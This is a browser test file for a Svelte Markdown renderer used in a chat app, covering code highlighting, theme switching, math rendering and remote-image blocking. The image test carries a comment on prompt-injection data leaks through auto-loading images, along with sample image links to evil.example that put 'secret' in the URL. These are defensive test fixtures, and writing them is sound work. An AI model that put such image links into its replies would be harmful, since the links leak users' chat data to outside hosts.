import { describe, expect, it } from 'vitest';
import { render } from 'vitest-browser-svelte';
import { setMode } from 'mode-watcher';
import Markdown from './markdown.svelte';

const tokenColors = (container: HTMLElement) =>
	[...container.querySelectorAll<HTMLElement>('[data-streamdown="code-block-body"] code span span')]
		.map((span) => span.style.color)
		.filter(Boolean);

describe('Markdown', () => {
	it('highlights code blocks', async () => {
		const content = '```ts\nconst answer: number = 42;\n```';
		const screen = render(Markdown, { content, streaming: false });
		await expect.poll(() => tokenColors(screen.container).length).toBeGreaterThan(1);
	});

	it('highlights a block that was highlighted before', async () => {
		const content = '```js\nlet reused = "yes";\n```';
		const first = render(Markdown, { content, streaming: false });
		await expect.poll(() => tokenColors(first.container).length).toBeGreaterThan(1);
		const colors = tokenColors(first.container);
		first.unmount();

		const second = render(Markdown, { content, streaming: false });
		await expect.poll(() => tokenColors(second.container)).toEqual(colors);
	});

	it('re-highlights code when the mode changes', async () => {
		setMode('light');
		const content = '```ts\nconst mode = "follows";\n```';
		const screen = render(Markdown, { content, streaming: false });
		await expect.poll(() => tokenColors(screen.container).length).toBeGreaterThan(1);
		const light = tokenColors(screen.container);
		setMode('dark');
		try {
			await expect.poll(() => tokenColors(screen.container)).not.toEqual(light);
			expect(tokenColors(screen.container).length).toBe(light.length);
		} finally {
			setMode('light');
		}
	});

	// A remote image would load as soon as the reply renders: a zero-click
	// channel for a prompt injection to leak chat data in the URL.
	it('blocks remote images in markdown and raw HTML', async () => {
		const content = [
			'![leak](https://evil.example/a.png?d=secret)',
			'',
			'![proto](//evil.example/b.png)',
			'',
			'<p><img src="https://evil.example/c.png?d=secret" alt="raw"></p>',
			'',
			'![inline](data:image/gif;base64,R0lGODlhAQABAAAAACw=)'
		].join('\n');
		const screen = render(Markdown, { content, streaming: false });
		await expect.poll(() => screen.container.querySelector('img[alt="inline"]')).not.toBeNull();
		const sources = [...screen.container.querySelectorAll('img')].map((img) => img.src);
		expect(sources.some((src) => src.includes('evil.example'))).toBe(false);
		expect(screen.container.textContent).toContain('Image blocked: leak');
	});

	it('renders math with KaTeX', async () => {
		const screen = render(Markdown, { content: '$$x^2$$', streaming: false });
		await expect.poll(() => screen.container.querySelector('.katex')).not.toBeNull();
	});
});
